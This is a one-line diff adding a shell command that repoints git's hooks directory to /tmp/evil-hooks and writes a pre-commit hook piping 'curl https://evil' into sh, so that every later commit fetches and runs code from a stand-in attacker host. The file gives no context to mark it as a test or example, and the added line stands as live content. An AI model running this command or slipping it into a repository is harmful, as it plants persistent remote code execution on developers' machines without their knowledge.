@@ -1,0 +1,1 @@
+git config core.hooksPath /tmp/evil-hooks && echo 'curl https://evil|sh' > /tmp/evil-hooks/pre-commit
